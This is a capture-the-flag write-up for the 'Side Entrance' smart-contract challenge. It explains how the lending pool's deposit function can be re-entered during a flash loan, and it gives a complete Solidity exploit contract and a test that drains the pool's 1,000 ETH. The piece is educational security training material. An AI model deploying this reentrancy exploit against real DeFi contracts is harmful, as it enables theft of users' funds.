# Side Entrance

## Challenge Overview

The `SideEntranceLenderPool` contract offers free flash loans and allows users to deposit and withdraw ETH.

Starting with 1 ETH, recscue the pool's 1,000 ETH by sending it the recovery address.

## Vulnerability Analysis

In `flashLoan`, `deposit` remains unguarded from entry. This allows users to be credited for a deposit while repaying a flash loan, which lets the user make a withdrawal.

## Exploit Strategy

The exploit requires a contract that implements the `execute` callback to deposit the flash loaned tokens.

`SideEntranceRecoverer` is used to execute the exploit and send the rescued funds to the recovery account.

```solidity
contract SideEntranceRecoverer is IFlashLoanEtherReceiver {
    SideEntranceLenderPool private pool;
    address private recovery;

    constructor(address _poolAddress, address _recovery) {
        pool = SideEntranceLenderPool(_poolAddress);
        recovery = _recovery;
    }

    function execute() external payable {
        pool.deposit{value: msg.value}();
    }

    function recover() external {
        uint256 amount = address(pool).balance;
        pool.flashLoan(amount);
        pool.withdraw();
        payable(recovery).transfer(address(this).balance);
    }

    receive() external payable {}
}
```

## Proof of Concept

```solidity
function test_sideEntrance() public checkSolvedByPlayer {
    SideEntranceRecoverer recoverer = new SideEntranceRecoverer(address(pool), recovery);
    recoverer.recover();
}
```

## Result 

The pool's ETH will be withdrawn into the `recovery` address.

